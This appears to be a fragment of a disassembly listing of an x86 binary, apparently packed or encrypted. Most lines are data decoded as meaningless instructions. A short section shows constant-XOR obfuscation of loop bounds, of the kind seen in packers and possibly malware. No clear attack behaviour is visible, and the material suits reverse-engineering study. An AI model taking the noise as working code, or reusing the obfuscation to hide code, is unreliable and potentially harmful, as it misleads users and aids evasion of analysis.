  41cd61:	out    0xf8,eax
  41cd63:	(bad)  
  41cd64:	fcmovnb st,st(2)
  41cd66:	add    esp,ebx
  41cd68:	add    ebx,ebx
  41cd6a:	out    0xed,eax
  41cd6c:	lock repz sar DWORD PTR [ebp-0x25242417],1
  41cd74:	jmp    0xd9ce:0xc5f2b7cc
  41cd7b:	jmp    0xe0f3:0x7e1f2d0
  41cd82:	shr    bl,0xe8
  41cd85:	jecxz  0x41cd91
  41cd87:	iret   
  41cd88:	out    dx,eax
  41cd89:	jecxz  0x41cd8b
  41cd8b:	out    0xc0,al
  41cd8d:	loopne 0x41cd86
  41cd8f:	jecxz  0x41cd83
  41cd91:	mov    esp,0xf2e4f6c5
  41cd96:	call   0xcc0cc58f
  41cd9b:	fscale 
  41cd9d:	std    
  41cd9e:	mov    ecx,0xf2daf4c0
  41cda3:	retf   
  41cda4:	sar    DWORD PTR [esi-0x1fb3af2],0xf3
  41cdab:	out    0xbc,eax
  41cdad:	mov    al,0xbc
  41cdaf:	repz enter 0xc9c0,0xe9
  41cdb4:	loope  0x41cdad
  41cdb6:	lods   eax,DWORD PTR ds:[esi]
  41cdb7:	shr    esp,cl
  41cdb9:	rcr    al,cl
  41cdbb:	fucom  st(3)
  41cdbd:	jecxz  0x41cda0
  41cdbf:	fistp  QWORD PTR [ebp-0x3f0042fe]
  41cdc5:	retf   0xf9dc
  41cdc8:	aad    0xc5
  41cdca:	jmp    0xb212b6a7
  41cdcf:	out    dx,al
  41cdd0:	loopne 0x41cda4
  41cdd2:	jmp    0xef09b2b7
  41cdd7:	mov    esi,0xf7dfefe5
  41cddc:	add    cl,ah
  41cdde:	push   edi
  41cde0:	cmc    
  41cde1:	rcr    dl,cl
  41cde3:	add    al,0xc2
  41cde5:	fild   DWORD PTR [esi]
  41cde7:	(bad)  
  41cde9:	repz ror DWORD PTR [ecx],0xf0
  41cded:	mov    esi,0xf0e0e6c0
  41cdf2:	lock jmp 0x41cdef
  41cdf5:	mov    dl,0xce
  41cdf7:	lods   al,BYTE PTR ds:[esi]
  41cdf8:	fsubrp st(4),st
  41cdfa:	in     eax,dx
  41cdfb:	into   
  41cdfc:	stc    
  41cdfd:	mov    dh,0xd6
  41cdff:	fcmovb st,st(0)
  41ce01:	mov    edx,0xd5bfd6fa
  41ce06:	mul    dl
  41ce08:	paddb  mm1,mm5
  41ce0b:	or     al,0xd8
  41ce0d:	test   al,0xe8
  41ce0f:	ror    esp,0xd3
  41ce12:	ret    0xeaba
  41ce15:	mov    dh,0xf5
  41ce17:	ror    ah,cl
  41ce19:	repz out dx,eax
  41ce1b:	sar    DWORD PTR [ecx-0x42b25ff],1
  41ce21:	(bad)  
  41ce23:	or     ecx,ecx
  41ce25:	loope  0x41cde7
  41ce27:	or     eax,0xfedbcbc8
  41ce2c:	test   al,0xae
  41ce2e:	into   
  41ce2f:	loopne 0x41cde1
  41ce31:	test   ch,0xdb
  41ce34:	sti    
  41ce35:	repz (bad) 
  41ce37:	(bad)  
  41ce39:	mov    esp,0xf5f1c2d5
  41ce3e:	(bad)  
  41ce3f:	add    al,BYTE PTR ds:0xbfe101bc
  41ce45:	bswap  eax
  41ce47:	out    0xdb,eax
  41ce49:	out    dx,eax
  41ce4a:	fdivr  st(3),st
  41ce4c:	repz call 0xd1f77b23
  41ce52:	in     al,0xef
  41ce54:	int3   
  41ce55:	in     eax,0xcf
  41ce57:	iret   
  41ce58:	hlt    
  41ce59:	shl    edx,cl
  41ce5b:	(bad)  
  41ce5d:	stc    
  41ce5e:	ret    0xdfec
  41ce61:	clc    
  41ce62:	icebp  
  41ce63:	stc    
  41ce64:	xlat   BYTE PTR ds:[ebx]
  41ce65:	in     eax,0xcb
  41ce67:	rol    ch,0xde
  41ce6a:	out    dx,eax
  41ce6b:	add    cl,ch
  41ce6d:	ror    dl,1
  41ce6f:	(bad)  
  41ce70:	repnz mov cl,0xd4
  41ce74:	repz loopne 0x41ce71
  41ce77:	cmc    
  41ce78:	in     eax,dx
  41ce79:	cmc    
  41ce7a:	int    0xf4
  41ce7c:	(bad)  
  41ce7d:	aad    0xd0
  41ce7f:	add    eax,0xe5d0e1f3
  41ce84:	shl    edx,0xf5
  41ce87:	jmp    0xedae:0xf113eb08
  41ce8e:	(bad)  
  41ce90:	shr    DWORD PTR [ebp-0x1b155339],cl
  41ce96:	fdivr  DWORD PTR [eax-0x9122b10]
  41ce9c:	(bad)  
  41ce9e:	mov    DWORD PTR ds:0xe7fec7d1,0xdcdafff0
  41cea8:	or     esp,esp
  41ceaa:	sar    ebp,0xeb
  41cead:	mov    edi,0xb3c3e7e2
  41ceb2:	shl    dh,0xd7
  41ceb5:	out    0xe4,eax
  41ceb7:	call   0xfe2da67a
  41cebc:	std    
  41cebd:	(bad)  
  41cebe:	fidiv  WORD PTR [eax+ebx*8-0x50e0b0d]
  41cec5:	std    
  41cec6:	xlat   BYTE PTR ds:[ebx]
  41cec7:	out    0xf4,al
  41cec9:	or     bl,bl
  41cecb:	in     al,dx
  41cecc:	scas   al,BYTE PTR es:[edi]
  41cecd:	retf   0xd6c9
  41ced0:	xlat   BYTE PTR ds:[ebx]
  41ced1:	test   bh,0xcc
  41ced4:	mov    ecx,0xfab9d2c8
  41ced9:	out    dx,eax
  41ceda:	mov    esi,0xbd02f601
  41cedf:	pop    es
  41cee0:	add    esi,esi
  41cee2:	(bad)  
  41cee3:	out    0xe5,al
  41cee5:	jecxz  0x41ced5
  41cee7:	push   esp
  41cee9:	cli    
  41ceea:	or     eax,0xcaaaede6
  41ceef:	loopne 0x41cee2
  41cef1:	lods   al,BYTE PTR ds:[esi]
  41cef2:	test   eax,0xf7e7d4e8
  41cef7:	(bad)  
  41cef8:	leave  
  41cef9:	into   
  41cefa:	lock iret 
  41cefc:	fcomip st,st(6)
  41cefe:	add    edx,edi
  41cf00:	stc    
  41cf01:	lock rcr edx,1
  41cf04:	neg    eax
  41cf06:	in     eax,0xd
  41cf08:	in     eax,0xff
  41cf0a:	out    dx,al
  41cf0b:	jmp    0xc12facf3
  41cf10:	out    dx,al
  41cf11:	leave  
  41cf12:	int    0xba
  41cf14:	(bad)
  41cf17:	(bad)  
  41cf18:	clc    
  41cf19:	jecxz  0x41cee9
  41cf1b:	test   DWORD PTR [edx],0xe701ded4
  41cf21:	mov    DWORD PTR [esi+edx*8],0xd4dafd02
  41cf28:	cld    
  41cf29:	or     edi,esp
  41cf2b:	add    BYTE PTR [ebp-0x81e3935],bh
  41cf31:	mov    bl,0xf1
  41cf33:	mov    ch,0xe6
  41cf35:	fnstenv [esi-0x2320125]
  41cf3b:	int    0xc2
  41cf3d:	call   0xf3099313
  41cf42:	push   es
  41cf43:	fld    QWORD PTR [edi]
  41cf45:	push   es
  41cf46:	fxch   st(2)
  41cf48:	fiadd  WORD PTR ds:0xf2d0cd04
  41cf4e:	test   eax,0xc7c0b2b7
  41cf53:	lods   al,BYTE PTR ds:[esi]
  41cf54:	fdivr  st,st(3)
  41cf56:	in     al,0xdb
  41cf58:	mov    edi,0xbaf1d7f9
  41cf5d:	loope  0x41cf51
  41cf5f:	out    dx,al
  41cf60:	in     al,dx
  41cf61:	in     al,dx
  41cf62:	fsubr  st,st(3)
  41cf64:	clc    
  41cf65:	or     ch,dh
  41cf67:	add    bh,cl
  41cf69:	into   
  41cf6a:	jmp    0xe2d2:0xaeaad9e9
  41cf71:	aad    0xac
  41cf73:	out    0xe4,eax
  41cf75:	(bad)  
  41cf76:	rcl    ah,cl
  41cf78:	mov    dh,0xe3
  41cf7a:	sar    BYTE PTR [ebx+0x3dfd2bd],1
  41cf80:	in     eax,0xd6
  41cf82:	faddp  st(7),st
  41cf84:	hlt    
  41cf85:	add    edi,eax
  41cf87:	fmul   QWORD PTR [ebx]
  41cf89:	or     bh,cl
  41cf8b:	cld    
  41cf8c:	loopne 0x41cf6e
  41cf8e:	(bad)  
  41cf8f:	jmp    0xad068784
  41cf94:	hlt    
  41cf95:	stc    
  41cf96:	repnz (bad) 
  41cf98:	(bad)  
  41cf99:	mov    esi,0xe2c3c2b5
  41cf9e:	ret    
  41cf9f:	rcl    esi,0xd5
  41cfa2:	out    0xbc,al
  41cfa4:	or     cl,cl
  41cfa6:	add    al,0xe6
  41cfa8:	fdivp  st(6),st
  41cfaa:	push   cs
  41cfab:	or     edi,DWORD PTR [eax-0x235b2930]
  41cfb1:	loop   0x41cf65
  41cfb3:	(bad)  
  41cfb6:	mov    dh,0xff
  41cfb8:	in     eax,0xc9
  41cfba:	std    
  41cfbb:	(bad)  
  41cfbd:	clc    
  41cfbe:	mov    ch,0x5
  41cfc0:	mov    esi,0xf5d2dfc5
  41cfc5:	(bad)  
  41cfc7:	(bad)  
  41cfc8:	out    dx,eax
  41cfc9:	add    ah,ch
  41cfcb:	or     bh,ah
  41cfcd:	iret   
  41cfce:	fdiv   QWORD PTR [eax-0x32311140]
  41cfd4:	icebp  
  41cfd5:	retf   0xbbd5
  41cfd8:	in     eax,0xf4
  41cfda:	jmp    0x41cfca
  41cfdc:	sti    
  41cfdd:	mov    edx,0xd2d8e7f2
  41cfe2:	cli    
  41cfe3:	fadd   st(1),st
  41cfe5:	neg    al
  41cfe7:	call   0xf849bdc4
  41cfec:	rol    ch,1
  41cfee:	mov    bh,0xcc
  41cff0:	(bad)  
  41cff2:	mov    bl,0xc6
  41cff4:	(bad)  
  41cff5:	int    0xdf
  41cff7:	mov    bh,0xc5
  41cff9:	retf   
  41cffa:	ret    
  41cffb:	ret    
  41cffc:	int3   
  41cffd:	fucomi st,st(6)
  41cfff:	add    eax,0xc5d6fabc
  41d004:	aam    0xf6
  41d006:	clc    
  41d007:	call   0xfb0a99f6
  41d00c:	rcl    eax,0xd3
  41d00f:	mov    esp,0xdaf1c5bc
  41d014:	call   0xf23da6ce
  41d019:	cmc    
  41d01a:	in     al,dx
  41d01b:	in     eax,dx
  41d01c:	sti    
  41d01d:	add    eax,DWORD PTR [edx]
  41d01f:	repnz cli 
  41d021:	add    al,0xfa
  41d023:	add    dl,al
  41d025:	fucom  st(0)
  41d027:	iret   
  41d028:	or     ah,dh
  41d02a:	fiadd  DWORD PTR [edi]
  41d02c:	stos   DWORD PTR es:[edi],eax
  41d02d:	int    0xc6
  41d02f:	lods   eax,DWORD PTR ds:[esi]
  41d030:	in     eax,dx
  41d031:	leave  
  41d032:	test   eax,0xccc5b4b6
  41d037:	in     al,dx
  41d038:	xlat   BYTE PTR ds:[ebx]
  41d039:	aad    0xca
  41d03b:	jmp    0xf23cca3a
  41d040:	fcmovbe st,st(1)
  41d042:	fdivp  st(3),st
  41d044:	fadd   st(6),st
  41d046:	std    
  41d047:	fldl2e 
  41d049:	hlt    
  41d04a:	sti    
  41d04b:	loop   0x41d015
  41d04d:	test   al,0xbc
  41d04f:	les    esi,FWORD PTR [ebx-0x33100c09]
  41d055:	push   esi
  41d057:	(bad)  
  41d058:	leave  
  41d059:	mov    ah,0xd3
  41d05b:	fsubrp st(3),st
  41d05d:	xlat   BYTE PTR ds:[ebx]
  41d05e:	repz fcompp 
  41d061:	clc    
  41d062:	add    eax,0xdd03f706
  41d067:	fmul   QWORD PTR [edi]
  41d069:	(bad)  
  41d06b:	into   
  41d06c:	mov    ecx,0xafb0eee8
  41d071:	enter  0xdbc6,0xda
  41d075:	rcr    ebx,1
  41d077:	iret   
  41d078:	mov    edx,0xf1d7b8c8
  41d07d:	(bad)  
  41d07f:	in     al,dx
  41d080:	sar    edi,cl
  41d082:	loope  0x41d066
  41d084:	cld    
  41d085:	test   DWORD PTR [edi],0xfe50ae5
  41d08b:	ffree  st(5)
  41d08d:	sar    DWORD PTR [edi+edx*8-0x144d4f33],1
  41d094:	call   0xd5f7b982
  41d099:	in     al,0xfa
  41d09b:	int    0xcc
  41d09d:	ret    
  41d09e:	repnz int3 
  41d0a0:	(bad)  
  41d0a1:	out    0xfe,al
  41d0a3:	clc    
  41d0a4:	in     al,0xdb
  41d0a6:	fmulp  st(6),st
  41d0a8:	fadd   DWORD PTR [esi]
  41d0aa:	add    DWORD PTR [eax],ecx
  41d0ac:	stos   DWORD PTR es:[edi],eax
  41d0ad:	fsubp  st(3),st
  41d0af:	int    0xd4
  41d0b1:	mov    dl,0xcc
  41d0b3:	mov    dh,0xb9
  41d0b5:	shr    ah,0xea
  41d0b8:	into   
  41d0b9:	rcl    eax,1
  41d0bb:	enter  0xe100,0xd3
  41d0bf:	fdivr  st,st(4)
  41d0c1:	fld    DWORD PTR [edx]
  41d0c3:	add    al,0xc3
  41d0c5:	sti    
  41d0c6:	aad    0xca
  41d0c8:	jmp    0x41d0ca
  41d0ca:	add    ebx,eax
  41d0cc:	in     al,0xf7
  41d0ce:	iret   
  41d0cf:	ret    0xf7dd
  41d0d2:	mov    ch,0xc7
  41d0d4:	xlat   BYTE PTR ds:[ebx]
  41d0d5:	mov    dl,0xf8
  41d0d7:	in     al,dx
  41d0d8:	(bad)  
  41d0d9:	retf   0x2ec
  41d0dc:	int    0xf5
  41d0de:	in     eax,dx
  41d0df:	aad    0xd1
  41d0e1:	ret    
  41d0e2:	repnz (bad) 
  41d0e4:	sti    
  41d0e5:	jmp    0xfd0d:0x4fcf5ee
  41d0ec:	int3   
  41d0ed:	shl    BYTE PTR [eax-0x1716532f],cl
  41d0f3:	shr    ch,1
  41d0f5:	jmp    0x41d0b2
  41d0f7:	into   
  41d0f8:	cli    
  41d0f9:	not    ch
  41d0fb:	in     al,dx
  41d0fc:	mov    esi,0xdddeb5d5
  41d101:	(bad)  
  41d103:	or     ecx,edx
  41d105:	fnstsw WORD PTR [ebp+0x509f904]
  41d10b:	fsub   st,st(6)
  41d10d:	fdivrp st(2),st
  41d10f:	shr    eax,1
  41d111:	mov    dh,0xc6
  41d113:	mov    ch,0xd0
  41d115:	mov    edx,0xbcf1bfb4
  41d11a:	out    dx,eax
  41d11b:	(bad)  
  41d11d:	add    eax,DWORD PTR [ebx]
  41d11f:	mov    eax,0xdc0ac1f9
  41d124:	(bad)  
  41d125:	(bad)  
  41d127:	or     al,BYTE PTR [ecx*8-0x101bed20]
  41d12e:	leave  
  41d12f:	fsubp  st(0),st
  41d131:	mov    ch,0xc4
  41d133:	fcmovne st,st(0)
  41d135:	repz call 0xea0ece18
  41d13b:	fsubrp st(1),st
  41d13d:	mov    dh,0xfd
  41d13f:	stc    
  41d140:	lock mov ebp,0xd7c9ebda
  41d146:	or     edx,ebp
  41d148:	cli    
  41d149:	adc    esp,ebp
  41d14b:	(bad)  
  41d14c:	mov    eax,0xd0a4f2cf
  41d151:	mov    cl,0xe0
  41d153:	in     al,dx
  41d154:	retf   
  41d155:	loopne 0x41d11f
  41d157:	fsubr  st,st(7)
  41d159:	cld    
  41d15a:	icebp  
  41d15b:	int    0xed
  41d15d:	aam    0x2
  41d15f:	mov    esi,0x9f2f707
  41d164:	loopne 0x41d15b
  41d166:	iret   
  41d167:	aad    0xe3
  41d169:	fmul   st,st(3)
  41d16b:	psllw  mm6,QWORD PTR [edx-0x3249160e]
  41d172:	repnz rol ah,0xf0
  41d176:	stc    
  41d177:	aad    0xcb
  41d179:	fxch   st(6)
  41d17b:	hlt    
  41d17c:	mov    edi,0xffc0fabc
  41d181:	cli    
  41d182:	(bad)  
  41d183:	out    0xe2,eax
  41d185:	sti    
  41d186:	loopne 0x41d195
  41d188:	or     al,cl
  41d18a:	paddd  mm4,QWORD PTR [edi-0x383b2850]
  41d191:	stos   BYTE PTR es:[edi],al
  41d192:	rol    ah,0xfa
  41d195:	in     al,dx
  41d196:	lock imul edx
  41d199:	in     al,0xf3
  41d19b:	jmp    0xd2ed:0xf5d2f6b8
  41d1a2:	xlat   BYTE PTR ds:[ebx]
  41d1a3:	add    esp,esi
  41d1a5:	push   es
  41d1a6:	fucomp st(1)
  41d1a8:	(bad)  
  41d1aa:	add    ah,dl
  41d1ac:	test   al,0xf1
  41d1ae:	lock rol al,0xc3
  41d1b2:	mov    dl,0xe1
  41d1b4:	(bad)  
  41d1b6:	int    0xbb
  41d1b8:	mov    dh,0xf3
  41d1ba:	sar    bl,cl
  41d1bc:	into   
  41d1bd:	cmc    
  41d1be:	int    0xbf
  41d1c0:	add    al,0x5
  41d1c2:	vpsubsb ymm0,ymm5,ymm5
  41d1c6:	fucomi st,st(6)
  41d1c8:	sti    
  41d1c9:	push   cs
  41d1ca:	or     al,0xf3
  41d1cc:	repnz mov edi,0xeaebd0c3
  41d1d2:	(bad)
  41d1d5:	sar    BYTE PTR [edx-0xc014034],1
  41d1db:	std    
  41d1dc:	out    dx,al
  41d1dd:	aam    0xcf
  41d1df:	(bad)  
  41d1e0:	fsub   st,st(2)
  41d1e2:	jecxz  0x41d1e3
  41d1e4:	jmp    0x450bae9
  41d1e9:	iret   
  41d1ea:	sti    
  41d1eb:	loope  0x41d1ab
  41d1ed:	(bad)  
  41d1ee:	scas   al,BYTE PTR es:[edi]
  41d1ef:	aad    0xee
  41d1f1:	leave  
  41d1f2:	in     al,0xfb
  41d1f4:	mov    cl,0xd6
  41d1f6:	call   0xfb11d0cd
  41d1fb:	in     al,dx
  41d1fc:	mov    edi,0xd6d9e2d3
  41d201:	(bad)  
  41d202:	fcomi  st,st(0)
  41d204:	fmul   QWORD PTR [eax]
  41d206:	out    dx,al
  41d207:	in     eax,0xdf
  41d209:	into   
  41d20a:	clc    
  41d20b:	add    ch,BYTE PTR [ebp+ebp*4-0x91a2849]
  41d212:	iret   
  41d213:	loop   0x41d1ee
  41d215:	jmp    0x41d202
  41d217:	lods   al,BYTE PTR ds:[esi]
  41d218:	stc    
  41d219:	in     al,dx
  41d21a:	in     eax,dx
  41d21b:	call   0xda41c2e1
  41d220:	in     eax,0xf8
  41d222:	in     eax,0xc7
  41d224:	xlat   BYTE PTR ds:[ebx]
  41d225:	lock jmp 0x41d22e
  41d228:	enter  0xcff3,0xd
  41d22c:	call   0xc523c8f4
  41d231:	rcl    bl,1
  41d233:	sti    
  41d234:	mov    dh,0xec
  41d236:	in     al,0xfb
  41d238:	shl    al,1
  41d23a:	int    0xe1
  41d23c:	hlt    
  41d23d:	(bad)  
  41d23f:	rol    ebx,1
  41d241:	(bad)  
  41d242:	repz std 
  41d244:	cmc    
  41d245:	fsubr  st,st(0)
  41d247:	or     eax,0xdfe2e2e9
  41d24c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d24d:	int3   
  41d24e:	int    0xef
  41d250:	shl    BYTE PTR [edi-0x2044054c],1
  41d256:	lods   eax,DWORD PTR ds:[esi]
  41d257:	(bad)  
  41d258:	mov    edi,0xfdfef5cf
  41d25d:	fucom  st(3)
  41d25f:	out    0xdc,al
  41d261:	sar    DWORD PTR [ebx+eax*1+0xbf4c9d1],cl
  41d268:	(bad)  
  41d269:	out    0xf3,eax
  41d26b:	out    dx,al
  41d26c:	faddp  st(4),st
  41d26e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d26f:	iret   
  41d270:	jmp    0xea16a235
  41d275:	test   bl,0xce
  41d278:	cld    
  41d279:	int    0xd6
  41d27b:	std    
  41d27c:	aad    0xfb
  41d27e:	(bad)  
  41d27f:	rol    BYTE PTR ds:0xbfe3c206,0xb
  41d286:	or     ah,dh
  41d288:	aam    0xe8
  41d28a:	add    eax,0xc5f2d3f2
  41d28f:	lods   eax,DWORD PTR ds:[esi]
  41d290:	enter  0xcae9,0xca
  41d294:	aad    0xb1
  41d296:	jmp    0xb61fac91
  41d29b:	not    dl
  41d29d:	mov    ebp,0xe7bbd8da
  41d2a2:	or     ebx,ebp
  41d2a4:	or     bl,cl
  41d2a6:	xlat   BYTE PTR ds:[ebx]
  41d2a7:	fsub   st(0),st
  41d2a9:	in     eax,0xcd
  41d2ab:	out    0xad,al
  41d2ad:	ret    0xe7d0
  41d2b0:	rol    al,1
  41d2b2:	mov    ch,0xd2
  41d2b4:	jmp    0xb42ec785
  41d2b9:	xlat   BYTE PTR ds:[ebx]
  41d2ba:	fmul   st,st(2)
  41d2bc:	rcr    ch,cl
  41d2be:	out    dx,eax
  41d2bf:	in     eax,dx
  41d2c0:	(bad)  
  41d2c1:	aam    0xf3
  41d2c3:	xlat   BYTE PTR ds:[ebx]
  41d2c4:	out    0x6,al
  41d2c6:	push   es
  41d2c7:	cld    
  41d2c8:	fld    QWORD PTR [eax]
  41d2ca:	(bad)  
  41d2cc:	ror    dl,1
  41d2ce:	mov    cl,0xca
  41d2d0:	mov    dh,0xd7
  41d2d2:	in     al,dx
  41d2d3:	in     al,0xfa
  41d2d5:	(bad)  
  41d2d6:	mov    edi,0xbbbbdfac
  41d2db:	fincstp 
  41d2dd:	(bad)  
  41d2df:	mov    eax,0xe7f4c7ed
  41d2e4:	neg    al
  41d2e6:	aam    0xdf
  41d2e8:	or     eax,0xe8d3e2e7
  41d2ed:	mov    bl,0xcb
  41d2ef:	mov    cl,0xb1
  41d2f1:	ror    al,0xba
  41d2f4:	mov    dh,0xbb
  41d2f6:	fbstp  TBYTE PTR [edi-0x22a0908]
  41d2fc:	mov    esp,0xe6b4dbf5
  41d301:	add    al,0xf5
  41d303:	fcom   st(0)
  41d305:	out    0xe8,eax
  41d307:	fsub   st(2),st
  41d309:	fcmovnu st,st(0)
  41d30b:	add    al,0xde
  41d30d:	(bad)
  41d311:	lods   eax,DWORD PTR ds:[esi]
  41d312:	out    dx,al
  41d313:	mov    dl,0xba
  41d315:	mov    ebx,0xf7c5f4f7
  41d31a:	mov    edi,0xd8feda03
  41d31f:	mov    eax,0xdff0d5c5
  41d324:	add    esi,eax
  41d326:	push   es
  41d327:	neg    dl
  41d329:	or     al,0x0
  41d32b:	or     esp,ecx
  41d32d:	rol    esp,0xd7
  41d330:	aam    0xb3
  41d332:	in     eax,dx
  41d333:	loope  0x41d2fe
  41d335:	aad    0xdf
  41d337:	stc    
  41d338:	call   0xf737881a
  41d33d:	add    ebp,ecx
  41d33f:	hlt    
  41d340:	push   es
  41d341:	jecxz  0x41d2fc
  41d343:	jecxz  0x41d320
  41d345:	lock (bad) 
  41d347:	loopne 0x41d344
  41d349:	stc    
  41d34a:	add    esp,ecx
  41d34c:	loop   0x41d316
  41d34e:	into   
  41d34f:	shl    edi,0xe7
  41d352:	enter  0xf6b0,0xed
  41d356:	(bad)  
  41d357:	out    dx,eax
  41d358:	hlt    
  41d359:	jmp    0xd33cd53c
  41d35e:	mov    eax,0xc506d0ed
  41d363:	add    ebp,eax
  41d365:	sti    
  41d366:	iret   
  41d367:	fmul   DWORD PTR [ecx]
  41d369:	sti    
  41d36a:	or     esi,ecx
  41d36c:	in     al,0xe6
  41d36e:	in     al,dx
  41d36f:	mov    esp,0xbbf7d3ed
  41d374:	scas   eax,DWORD PTR es:[edi]
  41d375:	enter  0xd4da,0xe4
  41d379:	shl    dh,cl
  41d37b:	repz mov ebp,0xc3c3e0c1
  41d381:	mov    esi,0xfffa03da
  41d386:	retf   
  41d387:	in     eax,0xfb
  41d389:	jmp    0x41d38f
  41d38b:	iret   
  41d38c:	repnz icebp 
  41d38e:	mov    bl,0xef
  41d390:	loopne 0x41d368
  41d392:	mov    al,0xa8
  41d394:	loopne 0x41d360
  41d396:	not    bh
  41d398:	into   
  41d399:	sti    
  41d39a:	out    dx,eax
  41d39b:	mov    eax,0xe1d6ef01
  41d3a0:	stc    
  41d3a1:	les    ecx,FWORD PTR [ebx]
  41d3a3:	std    
  41d3a4:	cld    
  41d3a5:	fdivp  st(3),st
  41d3a7:	cli    
  41d3a8:	hlt    
  41d3a9:	call   0xc70ba295
  41d3ae:	(bad)  
  41d3af:	mov    al,0xe9
  41d3b1:	(bad)  
  41d3b2:	repz mov bh,0xe0
  41d3b5:	mov    cl,0xd5
  41d3b7:	mov    ecx,0xdaf9e8d4
  41d3bc:	rcr    eax,1
  41d3be:	loop   0x41d39f
  41d3c0:	add    eax,0xebe4e3cc
  41d3c5:	out    dx,eax
  41d3c6:	or     ebp,ebp
  41d3c8:	or     BYTE PTR [edx],al
  41d3ca:	out    0xe5,al
  41d3cc:	loop   0x41d380
  41d3ce:	shl    DWORD PTR [eax-0x91a3b33],0xe4
  41d3d5:	int3   
  41d3d6:	shr    dl,1
  41d3d8:	fldlg2 
  41d3da:	retf   
  41d3db:	mov    ebp,0xf0c2f8f1
  41d3e0:	add    ecx,0x3272fb
  41d3e6:	sub    eax,ecx
  41d3e8:	cmp    edx,eax
  41d3ea:	jne    0x421c8b
  41d3f0:	mov    eax,DWORD PTR [ebp-0x8]
  41d3f3:	add    eax,DWORD PTR [ebp-0x10c]
  41d3f9:	mov    al,BYTE PTR [eax]
  41d3fb:	mov    BYTE PTR [ebp-0x131],al
  41d401:	mov    eax,DWORD PTR [ebp-0x118]
  41d407:	xor    eax,0x75108b5
  41d40c:	add    eax,0x3272fb
  41d411:	mov    DWORD PTR [ebp-0x138],eax
  41d417:	jmp    0x41d429
  41d41c:	mov    eax,DWORD PTR [ebp-0x138]
  41d422:	inc    eax
  41d423:	mov    DWORD PTR [ebp-0x138],eax
  41d429:	mov    eax,DWORD PTR [ebp-0x114]
  41d42f:	xor    eax,0x75108b5
  41d434:	add    eax,0x3272fb
  41d439:	cmp    DWORD PTR [ebp-0x138],eax
  41d43f:	jmp    0x41f7e5
  41d444:	xor    BYTE PTR [eax-0xf141525],0x90
  41d44b:	lock inc ecx
  41d44d:	cs push 0xcf9314f3
  41d453:	jne    0x41d4a4
  41d455:	(bad)  
  41d456:	jp     0x41d4d3
  41d458:	add    bl,BYTE PTR [eax-0x2448485]
  41d45e:	repnz mov dh,0x8
  41d462:	(bad)  
  41d463:	fldlg2 
  41d465:	dec    BYTE PTR [ecx]
  41d467:	out    0xee,eax
  41d469:	loop   0x41d454
  41d46b:	scas   al,BYTE PTR es:[edi]
  41d46c:	enter  0xf3e6,0xdb
  41d470:	(bad)  
  41d471:	hlt    
  41d472:	out    0xec,eax
  41d474:	cld    
  41d475:	mov    ah,0xe9
  41d477:	retf   0xd5e2
  41d47a:	mov    ch,0xc2
  41d47c:	fadd   QWORD PTR [edx]
  41d47e:	loope  0x41d455
  41d480:	or     dl,dh
  41d482:	jmp    0xdf2ebb4b
  41d487:	(bad)  
  41d488:	scas   al,BYTE PTR es:[edi]
  41d489:	call   0xc404c17b
  41d48e:	fucomi st,st(4)
  41d490:	out    dx,eax
  41d491:	frstpm(287 only) 
  41d493:	fcmove st,st(5)
  41d495:	mov    ebx,0xdde2fadc
  41d49a:	hlt    
  41d49b:	mov    eax,0xe7d1e202
  41d4a0:	fld    st(5)
  41d4a2:	enter  0xfceb,0xe4
  41d4a6:	iret   
  41d4a7:	iret   
  41d4a8:	jmp    0xcbc8:0xe7c1b7f0
  41d4af:	mov    dh,0xc6
  41d4b1:	sti    
  41d4b2:	icebp  
  41d4b3:	(bad)  
  41d4b4:	les    eax,FWORD PTR [ebx]
  41d4b6:	fdivr  QWORD PTR [eax-0x123c403d]
  41d4bc:	clc    
  41d4bd:	fcmovnu st,st(7)
  41d4bf:	(bad)  
  41d4c1:	enter  0x7d6,0xfc
  41d4c5:	or     eax,0xaaa908ea
  41d4ca:	loopne 0x41d4a1
  41d4cc:	lods   al,BYTE PTR ds:[esi]
  41d4cd:	call   0xc533a39e
  41d4d2:	vpmaxsw ymm1,ymm6,ymm3
  41d4d6:	stc    
  41d4d7:	mov    ebx,0xdff9fcf2
  41d4dc:	mov    esp,0x9de0ad4
  41d4e1:	loop   0x41d4ea
  41d4e3:	cmc    
  41d4e4:	jecxz  0x41d4c0
  41d4e6:	call   0xadf396d1
  41d4eb:	mov    cl,0xd5
  41d4ed:	mov    al,0xd1
  41d4ef:	mov    al,0xfb
  41d4f1:	jmp    0x41d4d9
  41d4f3:	mov    ch,0xd3
  41d4f5:	sti    
  41d4f6:	fdecstp 
  41d4f8:	aad    0x0
  41d4fa:	ret    0xecde
  41d4fd:	xlat   BYTE PTR ds:[ebx]
  41d4fe:	out    0xe6,eax
  41d500:	loop   0x41d500
  41d502:	pop    es
  41d503:	sti    
  41d504:	or     al,0xdb
  41d506:	add    eax,0xbfdee3e2
  41d50b:	(bad)
  41d50e:	in     eax,0xcf
  41d510:	ror    ebx,1
  41d512:	lock out 0xf9,al
  41d515:	repnz mov eax,0xd3f8e9bd
  41d51b:	add    eax,0xc1dce7f0
  41d520:	in     al,0xfb
  41d522:	out    dx,al
  41d523:	(bad)  
  41d524:	std    
  41d525:	jmp    0x41d4ef
  41d527:	iret   
  41d528:	lods   al,BYTE PTR ds:[esi]
  41d529:	fdivr  QWORD PTR [edi-0x242f4d32]
  41d52f:	cmc    
  41d530:	(bad)  
  41d531:	lock mov ecx,0xd8f2cbd9
  41d537:	leave  
  41d538:	int    0xc2
  41d53a:	add    bh,cl
  41d53c:	mov    DWORD PTR [edx],0x8f7e2d3
  41d542:	div    ah
  41d544:	or     bl,bl
  41d546:	or     ah,cl
  41d548:	int3   
  41d549:	mov    cl,0xd1
  41d54b:	mov    ebp,0xf9faecd1
  41d550:	shl    ah,1
  41d552:	(bad)  
  41d553:	aad    0xbb
  41d555:	mov    ecx,0xfcdbb4cb
  41d55a:	fnstsw WORD PTR [edi-0x18272a25]
  41d560:	icebp  
  41d561:	cli    
  41d562:	jmp    0xe0e1:0xdf02e6e8
  41d569:	int3   
  41d56a:	jmp    0xfbc9:0xe1cec3b3
  41d571:	jmp    0x41d528
  41d573:	leave  
  41d574:	mov    esi,0xc2d0e2ce
  41d579:	loopne 0x41d569
  41d57b:	(bad)  
  41d57d:	mul    edx
  41d57f:	add    eax,0xe09f0fe
  41d584:	add    al,dl
  41d586:	jecxz  0x41d548
  41d588:	ret    0xd2bd
  41d58b:	imul   esi
  41d58d:	loopne 0x41d576
  41d58f:	leave  
  41d590:	mov    ah,0xe9
